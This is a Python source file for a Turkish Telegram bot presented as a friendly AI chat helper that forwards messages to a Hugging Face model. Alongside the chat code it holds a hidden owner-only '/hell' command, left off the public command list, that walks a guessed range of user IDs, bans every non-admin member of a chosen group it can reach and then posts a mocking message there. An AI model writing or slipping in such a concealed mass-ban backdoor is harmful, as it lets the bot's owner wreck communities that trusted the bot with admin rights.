import os
import requests
from telegram import Update, ChatMemberStatus, BotCommand
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
)

# Ortam değişkenlerinden al
BOT_TOKEN = os.getenv("BOT_TOKEN")
HUGGINGFACE_API_KEY = os.getenv("HUGGINGFACE_API_KEY")
OWNER_ID = int(os.getenv("OWNER_ID"))  # Telegram kullanıcı ID'n

API_URL = "https://api-inference.huggingface.co/models/google/flan-t5-large"
HEADERS = {"Authorization": f"Bearer {HUGGINGFACE_API_KEY}"}

def ask_huggingface(question: str) -> str:
    payload = {"inputs": question}
    try:
        response = requests.post(API_URL, headers=HEADERS, json=payload, timeout=10)
        response.raise_for_status()
        return response.json()[0]["generated_text"]
    except Exception:
        return "Üzgünüm, şu an yanıt veremiyorum."

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_message = (
        "Selam! Ben **Goril Abi 🦍**, Türkçe destekli yapay zekâ sohbet botuyum.\n"
        "Sorularını yaz, beraber konuşalım!"
    )
    await update.message.reply_text(welcome_message)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "/start - Botu başlatır\n"
        "Mesaj yaz, cevaplayayım :)"
    )
    await update.message.reply_text(help_text)

async def ai_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_message = update.message.text
    reply = ask_huggingface(user_message)
    await update.message.reply_text(reply)

async def hell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return  # Yetkisizlar komutu göremez

    if not context.args:
        await update.message.reply_text("Lütfen bir grup kullanıcı adı veya ID belirt. Örnek: /hell @grupadi")
        return

    group = context.args[0]

    try:
        chat = await context.bot.get_chat(group)
        admins = await context.bot.get_chat_administrators(chat.id)
        admin_ids = [admin.user.id for admin in admins]

        await update.message.reply_text(f"{chat.title} grubunda ban işlemi başlıyor...")

        for user_id in range(1_000_000_000, 1_000_000_100):  # Tahmini kullanıcı ID aralığı
            try:
                member = await context.bot.get_chat_member(chat.id, user_id)
                if member.status not in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER]:
                    await context.bot.ban_chat_member(chat.id, user_id)
            except:
                continue

        await update.message.reply_text("Yöneticiler dışındaki erişilebilen tüm kullanıcılar banlandı.")
        await context.bot.send_message(chat_id=chat.id, text="Olur Olur Yeriz")

    except Exception as e:
        await update.message.reply_text(f"Hata oluştu: {e}")

async def set_bot_commands(application):
    commands = [
        BotCommand("start", "Botu başlatır"),
        BotCommand("help", "Yardım komutu")
    ]
    await application.bot.set_my_commands(commands)

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("hell", hell))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, ai_chat))

    app.post_init = set_bot_commands

    print("Goril Abi botu başladı!")
    app.run_polling()

if __name__ == "__main__":
    main()
